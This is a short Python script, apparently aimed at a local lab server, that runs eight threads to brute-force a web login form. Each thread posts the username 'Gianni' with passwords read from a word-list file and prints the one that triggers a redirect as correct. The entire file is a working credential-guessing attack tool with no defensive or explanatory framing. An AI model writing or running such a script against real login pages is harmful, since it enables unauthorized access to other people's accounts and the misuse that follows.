import requests
import threading
from queue import Queue

url = "http://192.168.0.138:5000/" 

global STOPRUNNING
STOPRUNNING = False
 
class WorkerThread(threading.Thread) :
 
	def __init__(self, queue, tid, nFile) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
		self.file = nFile
 
	def run(self) :
		global STOPRUNNING

		password = open(self.file,'r').readlines()

		username = "Gianni"

		for ps in password :
			if not STOPRUNNING:
				http = requests.post(url,data={'username' : username, 'password' : ps[:-1]})
				content = http.content
				#print(http.url)
				if http.url == url:
					print(f"{ps[:-1]}")
					pass
				else:
					print(f"PASSWORD CORRECT : {ps[:-1]}")
					#self.queue.task_done()
					STOPRUNNING = True
					break
			else:
				#self.queue.task_done()
				break

		
 
queue = Queue()
 
threads = []
for i in range(1, 9) : # Number of threads
	worker = WorkerThread(queue, i, "try"+str(i)+".txt") 
	worker.start()
	threads.append(worker)
 
queue.join()
 
# wait for all threads to exit 
 
for item in threads :
	item.join()